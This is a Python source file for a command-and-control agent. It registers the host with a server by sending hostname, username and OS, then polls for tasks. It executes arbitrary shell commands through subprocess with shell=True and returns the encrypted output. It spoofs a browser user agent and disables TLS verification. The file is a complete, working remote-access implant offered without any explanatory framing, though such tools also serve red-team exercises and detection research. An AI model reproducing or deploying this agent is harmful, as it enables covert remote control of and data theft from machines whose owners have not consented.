#!/usr/bin/env python3
"""
C2 Agent - polls server, executes tasks, reports back
"""
import json
import os
import platform
import socket
import subprocess
import time
import urllib.request
import urllib.error
import ssl
from cryptography.fernet import Fernet

SERVER = "http://127.0.0.1:8443"
AGENT_ID = None
FERNET = None
UA = "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 Chrome/120.0.0.0 Safari/537.36"

def e(data):
    return {"cipher": FERNET.encrypt(json.dumps(data).encode()).decode()}

def d(data):
    return json.loads(FERNET.decrypt(data.encode()).decode())

def _req(url, data, use_ssl):
    body = json.dumps(data).encode() if data else None
    req = urllib.request.Request(url, data=body, headers={"Content-Type": "application/json", "User-Agent": UA})
    if use_ssl:
        ctx = ssl.create_default_context()
        ctx.check_hostname = False
        ctx.verify_mode = ssl.CERT_NONE
        return urllib.request.urlopen(req, context=ctx, timeout=10)
    return urllib.request.urlopen(req, timeout=10)

def http(url, data=None):
    try:
        resp = _req(url, data, True)
        return json.loads(resp.read().decode())
    except Exception:
        try:
            resp = _req(url, data, False)
            return json.loads(resp.read().decode())
        except Exception:
            return None

def get_key():
    global FERNET
    r = http(f"{SERVER}/api/key")
    if r:
        FERNET = Fernet(r["key"].encode())
        return True
    return False

def register():
    global AGENT_ID
    info = {
        "hostname": socket.gethostname(),
        "user": os.environ.get("USER", "?"),
        "os": f"{platform.system()} {platform.release()}",
    }
    r = http(f"{SERVER}/api/login", e(info))
    if r and "agent_id" in r:
        AGENT_ID = r["agent_id"]
        return r.get("interval", 5)
    return 5

def poll_tasks():
    r = http(f"{SERVER}/api/tasks/{AGENT_ID}")
    if r:
        return r.get("tasks", []), r.get("interval", 5)
    return [], 5

def exec_shell(cmd):
    try:
        res = subprocess.run(cmd, shell=True, capture_output=True, text=True, timeout=60)
        return {"stdout": res.stdout, "stderr": res.stderr, "code": res.returncode}
    except subprocess.TimeoutExpired:
        return {"stdout": "", "stderr": "TIMEOUT", "code": -1}
    except Exception as ex:
        return {"stdout": "", "stderr": str(ex), "code": -1}

def exec_task(task):
    t = task.get("type", "")
    p = task.get("payload", "")
    tid = task.get("id", 0)
    result = {"task_id": tid, "status": "done"}
    if t == "shell":
        result["output"] = exec_shell(p)
    elif t == "sleep":
        try:
            time.sleep(int(p))
        except:
            pass
        result["output"] = {"stdout": f"slept {p}s", "stderr": "", "code": 0}
    elif t == "exit":
        result["output"] = {"stdout": "exiting", "stderr": "", "code": 0}
        http(f"{SERVER}/api/tasks/{AGENT_ID}", e(result))
        os._exit(0)
    else:
        result["output"] = {"stdout": f"unknown type: {t}", "stderr": "", "code": -1}
    return result

def send_result(result):
    http(f"{SERVER}/api/tasks/{AGENT_ID}", e(result))

def main():
    import sys
    sys.stdout.reconfigure(line_buffering=True)  # noqa
    global SERVER
    if len(sys.argv) > 1:
        SERVER = sys.argv[1]
    print(f"[agent] connecting to {SERVER}")
    if not get_key():
        print("[agent] failed to get key")
        return
    interval = register()
    if not AGENT_ID:
        print("[agent] registration failed")
        return
    print(f"[agent] registered as {AGENT_ID}")
    while True:
        tasks, new_int = poll_tasks()
        if new_int:
            interval = new_int
        for t in tasks:
            r = exec_task(t)
            send_result(r)
            if t.get("type") == "exit":
                return
        time.sleep(interval)

if __name__ == "__main__":
    main()
